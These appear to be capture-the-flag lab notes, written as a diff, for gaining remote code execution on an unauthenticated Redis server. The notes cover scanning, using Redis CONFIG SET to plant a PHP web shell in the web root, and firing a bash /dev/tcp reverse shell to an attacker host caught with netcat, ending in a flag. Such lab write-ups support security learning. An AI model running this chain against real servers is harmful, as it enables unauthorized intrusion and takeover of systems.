@@ -1,0 +1,28 @@
+>> nmap -sV -p- 10.113.183.132
+
+>> apt install redis-tools
+
+>> redis-cli -h 10.113.183.132
+
+redis >> info
+
+Checked the writable directories in Redis
+>> CONFIG GET dir
+1) "dir"
+2) "/var/www/html"
+>> CONFIG GET dbfilename
+1) "dbfilename"
+2) "passwd"
+
+10.113.183.132:6379> SET x "<?php system($_GET['cmd']); ?>"
+10.113.183.132:6379> CONFIG SET dir /var/www/html
+10.113.183.132:6379> CONFIG SET dbfilename shell.php
+10.113.183.132:6379> SAVE
+
+on browser: http://10.113.183.132/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.113.81.36/4444+0%3E%261%27%22
+
+nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.113.183.132 56354
+
+thm{red1s_rce_w1thout_credent1als}
